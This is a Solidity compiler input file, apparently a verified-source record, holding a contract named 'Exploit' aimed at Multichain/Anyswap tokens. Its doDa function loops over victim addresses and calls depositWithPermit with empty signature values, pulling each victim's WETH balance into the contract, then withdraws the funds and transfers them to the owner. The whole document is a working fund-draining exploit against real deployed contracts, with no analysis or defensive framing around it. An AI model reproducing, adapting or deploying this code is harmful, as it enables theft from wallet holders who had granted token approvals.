{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 10000
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "multichain.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.4;\n\ninterface IAnyswapV5ERC20{\n\n    function depositWithPermit(address target, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s, address to) external returns (uint);\n\n    function withdraw() external;\n\n}\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\ncontract Exploit {\n\n    address owner;\n\n    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function doDa(address[] memory targets, address multi) external {\n\n        require(msg.sender == owner);\n\n        for(uint i=0; i<targets.length; i++){\n\n            IAnyswapV5ERC20(multi).depositWithPermit(\n                targets[i],\n                weth.balanceOf(targets[i]),\n                block.timestamp + 1000,\n                0,\n                bytes32(0),\n                bytes32(0),\n                address(this)\n            );\n\n        }\n\n        IAnyswapV5ERC20(multi).withdraw();\n\n        weth.transfer(msg.sender, weth.balanceOf(address(this)));\n\n    }\n\n}"
    }
  }
}